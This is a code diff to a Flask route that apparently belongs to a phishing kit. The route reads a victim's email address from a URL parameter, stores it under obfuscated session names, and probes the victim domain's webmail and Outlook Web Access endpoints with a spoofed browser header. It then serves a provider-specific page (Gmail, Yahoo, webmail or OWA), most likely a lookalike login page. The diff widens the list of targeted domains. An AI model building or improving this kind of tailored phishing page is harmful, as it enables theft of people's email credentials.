@@ -174,33 +174,37 @@ def success():
 @app.route("/")
 def route2():
     web_param = request.args.get('web')
-    
+
     if web_param and "@" in web_param:
         domain = web_param.split("@")[-1]  # Extract the domain part
+        allowed_domains = ["gmail.com", "yahoo.com", "yourwebmail.com", "yourowa.com"]  # Add custom domains
         
-        if domain in ["gmail.com", "yahoo.com"]:  # Check if it's allowed
+        if domain in allowed_domains:
             session['eman'] = web_param
             session['ins'] = domain
-            
+
             # Check for webmail and OWA endpoints
             webmail_url = f"https://{domain}/webmail"
             owa_url1 = f"https://owa.{domain}/owa/#path=/mail"
             owa_url2 = f"https://autodiscover.{domain}/owa/#path=/mail/search"
-            
+
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+
             try:
-                if requests.get(webmail_url, timeout=13).status_code == 200:
+                if requests.get(webmail_url, headers=headers, timeout=13).status_code == 200:
                     return render_template('webmail.html', eman=session['eman'], ins=session['ins'])
-                if requests.get(owa_url1, timeout=13).status_code == 200 or requests.get(owa_url2, timeout=3).status_code == 200:
+                if requests.get(owa_url1, headers=headers, timeout=13).status_code == 200 or \
+                   requests.get(owa_url2, headers=headers, timeout=3).status_code == 200:
                     return render_template('owa.html', eman=session['eman'], ins=session['ins'])
-            except requests.RequestException:
-                pass
+            except requests.RequestException as e:
+                print(f"Request failed: {e}")  # Debugging output
             
             # Render different templates based on domain
             if domain == "gmail.com":
                 return render_template('gmail.html', eman=session['eman'], ins=session['ins'])
             elif domain == "yahoo.com":
                 return render_template('yahoo.html', eman=session['eman'], ins=session['ins'])
-    
+
     # Default template if no valid email is given
     return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
